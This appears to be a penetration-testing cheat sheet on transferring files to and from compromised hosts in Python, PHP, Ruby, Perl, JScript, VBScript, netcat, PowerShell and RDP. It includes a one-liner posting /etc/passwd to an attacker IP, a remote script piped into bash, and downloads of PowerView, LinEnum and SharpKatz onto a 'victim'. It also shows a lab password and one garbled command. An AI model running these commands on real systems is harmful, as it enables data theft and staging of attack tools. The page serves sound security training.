---
title: Transferring files with code
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - exploitation
  - file transfer technique
  - backdoors
---

# Transferring files with code


## Python

### python2 Download

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### Python 3 - Download

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```


### Upload Operations using Python3

[uploadserver](uploadserver.md)

```bash
# Start the Python uploadserver Module
python3 -m uploadserver 

# Uploading a File Using a Python One-liner
python3 -c whet'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

htb-student | Password:HTB_@cademy_stdnt!)

## PHP

### PHP Download with File_get_contents()

```bash
# PHP file_get_contents() module to download content from a website combined with the file_put_contents() module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

### PHP Download with Fopen()

```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

### PHP Download a File and Pipe it to Bash

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
# The URL can be used as a filename with the @file function if the fopen wrappers have been enabled. 
```


## Ruby

### Download a File

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```


## Perl

### Download a File

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```


## JavaScript

### Download a file with wget.js

wget.js content:

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Download a File Using JavaScript and cscript.exe

Console Based Script Host from Microsoft Corporation belonging to Microsoft (r) Windows Script Host.

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


## VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic.

We'll create a file called `wget.vbs` and save the following content:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Now, download a File Using VBScript and cscript.exe

```cmd-session
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Netcat

### Printing information on screen

On the server side (attacking machine):

```bash
#data will be printed on screen
nc -lvp <port>  
```

On the client side (victim's machine):

```bash
echo “hello” | nc -v $ip <port>
```

###  Transfer data and save it in a file with netcat

#### Victim's Machine listening on `<Port>` 

On the client side (victim's machine):

```bash
nc -lvp <port> --recv-only > received.txt  
# --recv-only: to close the connection once the file transfer is finished.
```


On the server side (attacking machine):

```bash
# Data will be stored in reveived.txt file.
cat tobesentfile.txt | nc -v $ip <port>
# The option -q 0 will tell Netcat to close the connection once it finishes. 

# Alternative:
nc -q 0 $ipVictim <port> < tobesentfile.txt 

ncat --send-only $ipVictim <port> < tobesentfile.txt 
# The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted.
```

#### Victim's machine connects to netcat only to receive the file 

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.

On the server side (attacking machine):

```bash
sudo nc -l -p 443 -q 0 < tobesentfile.txt

ncat -l -p 443 --send-only < tobesentfile.txt
```

On the client side (victim's machine): Compromised Machine Connect to Netcat to Receive the File

```bash
nc $ipAttacker 443 > tobesentfile.txt

ncat $ipAttacker 443 --recv-only > tobesentfile.txt

# Using /dev/tcp to Receive the File
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## PowerShell Session File Transfer

PowerShell Remoting uses [Windows Remote Management (WinRM)](5985-5986-winrm-windows-remote-management.md), which is the Microsoft implementation of the [Web Services for Management (WS-Management)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protocol, to allow users to run PowerShell commands on remote computers.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell-session
Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials.

**Create a PowerShell Remoting Session to DATABASE01**

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

**Copy samplefile.txt from our Localhost to the DATABASE01 Session**

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Copy DATABASE.txt from DATABASE01 Session to our Localhost**

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. 

We can use [xfreerdp](xfreerdp.md) or [rdesktop](rdesktop.md) to download a file by mounting a linux folder. This shared will  allow us to transfer files to and from the RDP session. 

### Mounting a Linux Folder Using rdesktop

```bash
rdesktop $ipVictim -d <domain> -u <username> -p <'Password0@'> -r disk:linux="/home/user/rdesktop/files"
```


### Mounting a Linux Folder Using xfreerdp

 ```bash
xfreerdp /v:ipVictim /d:<domain> /u:<username> /p:<'Password0@'> /drive:linux,/home/plaintext/htb/academy/filetransfer
```

**To access the directory, we can connect to \\tsclient\ in Windows, allowing us to transfer files to and from the RDP session.**
